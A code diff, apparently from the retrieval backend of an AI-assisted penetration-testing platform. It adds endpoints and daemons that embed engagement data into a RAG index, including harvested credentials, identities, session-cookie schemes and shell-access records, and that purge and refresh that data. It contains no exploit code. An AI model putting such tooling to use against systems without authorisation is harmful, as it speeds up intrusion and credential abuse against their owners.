+            eng_join = "AND a.engagement_id = %s" if engagement_id else ""
+            eng_args = [str(engagement_id)] if engagement_id else []
+            cur.execute(
+                f"""SELECT p.banner, host(a.ip)::text AS ip, p.service, p.product FROM ports p
+                     JOIN assets a ON a.id = p.asset_id
+                     WHERE p.banner ILIKE '%%set-cookie%%' {eng_join}
+                     ORDER BY p.last_seen DESC LIMIT %s""",
+                eng_args + [limit])
+            import re as _re
+            for row in cur.fetchall():
+                banner = row.get("banner") or ""
+                for m in _re.finditer(r"[Ss]et-[Cc]ookie:\s*([A-Za-z0-9_.-]+)=", banner):
+                    if _load_session_scheme_into_rag(
+                            row["ip"], m.group(1),
+                            product=row.get("product") or row.get("service"),
+                            engagement_id=engagement_id):
+                        counts["session_scheme"] += 1
+                        break  # one per target is enough
+    except Exception as e:  # noqa: BLE001
+        logging.debug("backfill_tier3 failed: %s", e)
+    return counts
+
+
+@app.post("/rag/backfill/{source}", tags=["RAG"])
+def backfill_source_endpoint(source: str,
+                              engagement_id: Optional[str] = None,
+                              limit: int = 500,
+                              authorized: bool = Depends(auth)):
+    """Generic backfill: embed existing rows from a specific source's underlying
+    table(s) into rag_documents. Idempotent (dedup by value_hash). Requires
+    RAG_OBSERVED_FACTS=1. `source` supports:
+      'tier1' or one of ('verified_technique', 'vuln_finding',
+      'service_fingerprint', 'discovered_endpoint')
+      'tier2' or one of ('web_finding', 'info_disclosure')
+      'tier3' or one of ('failed_technique', 'subdomain_pattern',
+      'session_scheme', 'shell_access')
+      'credentials'
+      'all' — everything."""
+    if not observed_facts_enabled():
+        raise HTTPException(400, "RAG_OBSERVED_FACTS is disabled — set the env flag first")
+    src = (source or "").lower()
+    if src == "credentials":
+        n_c, n_i = _backfill_credentials_and_identities_to_rag(engagement_id=engagement_id, limit=limit)
+        return {"ok": True, "source": src, "credentials_embedded": n_c,
+                "identities_embedded": n_i}
+    if src in ("tier1", "verified_technique", "vuln_finding",
+                "service_fingerprint", "discovered_endpoint"):
+        counts = _backfill_tier1_to_rag(engagement_id=engagement_id, limit=limit)
+        return {"ok": True, "source": src, "counts": counts}
+    if src in ("tier2", "web_finding", "info_disclosure", "api_schema"):
+        counts = _backfill_tier2_to_rag(engagement_id=engagement_id, limit=limit)
+        return {"ok": True, "source": src, "counts": counts}
+    if src in ("tier3", "failed_technique", "subdomain_pattern",
+                "session_scheme", "shell_access"):
+        counts = _backfill_tier3_to_rag(engagement_id=engagement_id, limit=limit)
+        return {"ok": True, "source": src, "counts": counts}
+    if src == "all":
+        n_c, n_i = _backfill_credentials_and_identities_to_rag(engagement_id=engagement_id, limit=limit)
+        c1 = _backfill_tier1_to_rag(engagement_id=engagement_id, limit=limit)
+        c2 = _backfill_tier2_to_rag(engagement_id=engagement_id, limit=limit)
+        c3 = _backfill_tier3_to_rag(engagement_id=engagement_id, limit=limit)
+        return {"ok": True, "source": "all",
+                "counts": {**c1, **c2, **c3, "credentials": n_c, "identities": n_i}}
+    raise HTTPException(400, f"unknown source '{source}' — see docstring")
+
+
+# ── nightly purge daemon for observed/enum/credential/identity RAG rows ──────
+# Bounds rag_documents growth: without this, every build adds dozens of fact
+# rows and the ivfflat index gradually degrades. Runs in-process (no external
+# cron needed): one daemon thread sleeps 24h, calls purge_observed_facts for
+# every engagement, then sleeps again. Opt-out via RAG_PURGE_DISABLE=1.
+_RAG_PURGE_INTERVAL_SEC = int(os.environ.get("RAG_PURGE_INTERVAL_SEC", "86400"))
+_RAG_PURGE_AGE_DAYS = int(os.environ.get("RAG_PURGE_AGE_DAYS", "90"))
+_rag_purge_thread_started = False
+
+
+def _rag_nightly_purge_loop():
+    """Daemon-thread body: every RAG_PURGE_INTERVAL_SEC, purge rows older than
+    RAG_PURGE_AGE_DAYS. Logs the deleted count. Honors RAG_PURGE_DISABLE and
+    is a no-op when observed_facts_enabled() is False (nothing to purge if
+    nothing's embedded). Any exception sleeps and retries next tick."""
+    import time as _t, threading as _th
+    while True:
+        try:
+            if (os.environ.get("RAG_PURGE_DISABLE", "0").lower() not in ("1", "true", "yes", "on")
+                    and observed_facts_enabled()):
+                n = purge_observed_facts(older_than_days=_RAG_PURGE_AGE_DAYS)
+                if n:
+                    logging.info("rag nightly purge: deleted %d row(s) older than %d days",
+                                 n, _RAG_PURGE_AGE_DAYS)
+        except Exception as e:  # noqa: BLE001
+            logging.warning("rag nightly purge iteration failed: %s", e)
+        _t.sleep(_RAG_PURGE_INTERVAL_SEC)
+
+
+def _ensure_rag_purge_daemon():
+    """Idempotent start. Called from the FastAPI startup event + lazily on
+    the first fact-embed, so even test/dev stacks that skip startup still
+    get the purge loop armed."""
+    global _rag_purge_thread_started
+    if _rag_purge_thread_started:
+        return
+    import threading as _th
+    t = _th.Thread(target=_rag_nightly_purge_loop, name="rag-nightly-purge",
+                   daemon=True)
+    t.start()
+    _rag_purge_thread_started = True
+    logging.info("rag nightly purge daemon armed (interval=%ds, age=%dd)",
+                 _RAG_PURGE_INTERVAL_SEC, _RAG_PURGE_AGE_DAYS)
+
+
+@app.on_event("startup")
+def _start_rag_purge_daemon():
+    """Arm the nightly purge thread when rag-api comes up."""
+    try:
+        _ensure_rag_purge_daemon()
+    except Exception as e:  # noqa: BLE001
+        logging.warning("could not start rag purge daemon: %s", e)
+
+
+# ─── News engagement-match sweep daemon ──────────────────────────────────────
+# Periodically runs the batch matcher so new news items get tagged without
+# an operator click. Opt-out: NEWS_MATCH_DISABLE=1. The sweep is a no-op when
+# no engagement is selected on the ambient context — it won't thrash through
+# every known engagement, because there's no sane default to pick. Operators
+# who want cross-engagement sweeps can POST to the batch endpoint explicitly
+# with X-Engagement-Id per call.
+_NEWS_MATCH_INTERVAL_SEC = int(os.environ.get("NEWS_MATCH_INTERVAL_SEC", "1800"))
+_news_match_thread_started = False
+
+
+def _news_match_sweep_loop():
+    import time as _t
+    from datetime import timedelta as _td
+    while True:
+        try:
+            if os.environ.get("NEWS_MATCH_DISABLE", "0").lower() not in ("1", "true", "yes", "on"):
+                # Sweep every engagement that has at least one asset — the
+                # context-var path doesn't apply in a background thread.
+                try:
+                    with get_db() as conn, conn.cursor() as cur:
+                        cur.execute("SELECT DISTINCT engagement_id FROM assets "
+                                    "WHERE engagement_id IS NOT NULL LIMIT 50")
+                        eids = [str(r[0]) for r in cur.fetchall()]
+                except Exception:  # noqa: BLE001
+                    eids = []
+                for eid in eids:
+                    try:
+                        # Reuse the matcher directly (no HTTP round-trip).
+                        with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
+                            cur.execute("""
+                                SELECT * FROM news_items
+                                 WHERE status = ANY('{new,reviewed,follow_up}'::text[])
+                                 ORDER BY last_seen DESC LIMIT 200
+                            """)
+                            rows = cur.fetchall()
+                        cutoff = datetime.now(timezone.utc) - _td(hours=_NEWS_MATCH_MAX_AGE_HOURS)
+                        updated = 0
+                        for row in rows:
+                            md = row.get("metadata") or {}
+                            em = (md.get("engagement_match") or {}).get(eid) if isinstance(md, dict) else None
+                            if em and em.get("matched_at"):
+                                try:
+                                    prev = datetime.fromisoformat(em["matched_at"].replace("Z", "+00:00"))
+                                    if prev > cutoff:
+                                        continue
+                                except Exception:  # noqa: BLE001
+                                    pass
+                            block = _match_news_item_against_engagement(row, eid)
+                            _store_news_engagement_match(str(row["id"]), eid, block)
+                            updated += 1
+                        if updated:
+                            logging.info("news-match sweep eid=%s updated=%d", eid, updated)
+                    except Exception as e:  # noqa: BLE001
+                        logging.warning("news-match sweep eid=%s failed: %s", eid, e)
+        except Exception as e:  # noqa: BLE001
+            logging.warning("news-match sweep iteration failed: %s", e)
+        _t.sleep(_NEWS_MATCH_INTERVAL_SEC)
+
+
+def _ensure_news_match_daemon():
+    global _news_match_thread_started
+    if _news_match_thread_started:
+        return
+    import threading as _th
+    t = _th.Thread(target=_news_match_sweep_loop, name="news-match-sweep", daemon=True)
+    t.start()
+    _news_match_thread_started = True
+    logging.info("news-match sweep daemon armed (interval=%ds, max_age=%dh)",
+                 _NEWS_MATCH_INTERVAL_SEC, _NEWS_MATCH_MAX_AGE_HOURS)
+
+
+_refine_mine_thread_started = False
+_REFINE_MINE_INTERVAL_SEC = int(
+    os.environ.get("REFINE_MINE_INTERVAL_SEC", "3600") or "3600")
+_REFINE_MINE_MIN_HITS = int(
+    os.environ.get("REFINE_MINE_MIN_HITS", "3") or "3")
+
+
+def _refine_mine_sweep_loop():
+    """Hourly trace-mining pass that promotes recurring (error_signal,
+    successful_fix) pairs into pending learned patterns for operator review.
+    Operators get a webhook on each promotion so a Slack/n8n hook can prompt
+    them to open /refine-patterns/pending and approve."""
+    import time as _t
+    while True:
+        try:
+            if os.environ.get("REFINE_MINE_DISABLE", "0").lower() not in ("1", "true", "yes", "on"):
+                try:
+                    promoted = _mine_refine_pattern_candidates(
+                        limit=500, min_hits=_REFINE_MINE_MIN_HITS)
+                    if promoted:
+                        logging.info("refine-mine promoted %d pending patterns",
+                                     len(promoted))
+                        try:
+                            emit_webhook("refine_patterns_mined", "rag-knowledge",
+                                         {"promoted": len(promoted),
+                                          "signals": [p["signal"] for p in promoted]})
+                        except Exception:  # noqa: BLE001
+                            pass
+                    # Auto-approve pass — pending patterns that have been
+                    # shadow-applied in enough builds AND helped the LLM
+                    # recover get promoted to approved automatically.
+                    # Operator still sees them in the approved list and
+                    # can revoke if they later cause regressions.
+                    try:
+                        auto = _auto_approve_proven_patterns()
+                        if auto:
+                            logging.info("refine auto-approved %d patterns: %s",
+                                         len(auto), [a["id"] for a in auto])
+                    except Exception as _aae:  # noqa: BLE001
+                        logging.warning("refine auto-approve failed: %s", _aae)
+                except Exception as e:  # noqa: BLE001
+                    logging.warning("refine-mine iteration failed: %s", e)
+        except Exception as e:  # noqa: BLE001
+            logging.warning("refine-mine outer loop failed: %s", e)
+        _t.sleep(_REFINE_MINE_INTERVAL_SEC)
+
+
+def _ensure_refine_mine_daemon():
+    global _refine_mine_thread_started
+    if _refine_mine_thread_started:
+        return
+    import threading as _th
+    t = _th.Thread(target=_refine_mine_sweep_loop,
+                   name="refine-mine", daemon=True)
+    t.start()
+    _refine_mine_thread_started = True
+    logging.info("refine-mine daemon armed (interval=%ds, min_hits=%d)",
+                 _REFINE_MINE_INTERVAL_SEC, _REFINE_MINE_MIN_HITS)
+
+
+@app.on_event("startup")
+def _start_refine_mine_daemon():
+    try:
+        _ensure_refine_mine_daemon()
+    except Exception as e:  # noqa: BLE001
+        logging.warning("refine-mine daemon start failed: %s", e)
+
+
+@app.on_event("startup")
+def _start_news_match_daemon():
+    try:
+        _ensure_news_match_daemon()
+    except Exception as e:  # noqa: BLE001
+        logging.warning("could not start news-match daemon: %s", e)
+
+
+class PurgeObservedFactsResponse(BaseModel):
+    ok: bool
+    deleted: int
+
+
+@app.delete("/rag/observed-facts", tags=["RAG"])
+def delete_observed_facts(older_than_days: Optional[int] = None,
+                          engagement_id: Optional[str] = None,
+                          ip: Optional[str] = None,
+                          source: Optional[str] = None,
+                          authorized: bool = Depends(auth)):
+    """Purge observed-fact / enum-fact RAG rows. All params optional — combine to
+    scope the purge. Returns {ok, deleted}. Idempotent (second call = 0)."""
+    if source and source not in _RAG_FACT_SOURCES:
+        raise HTTPException(400, f"source must be one of {list(_RAG_FACT_SOURCES)}")
+    n = purge_observed_facts(older_than_days=older_than_days,
+                              engagement_id=engagement_id, ip=ip, source=source)
+    return {"ok": True, "deleted": n}
 
 _CUSTOM_SKILLS_DDL = """
 CREATE TABLE IF NOT EXISTS public.custom_vuln_skills (
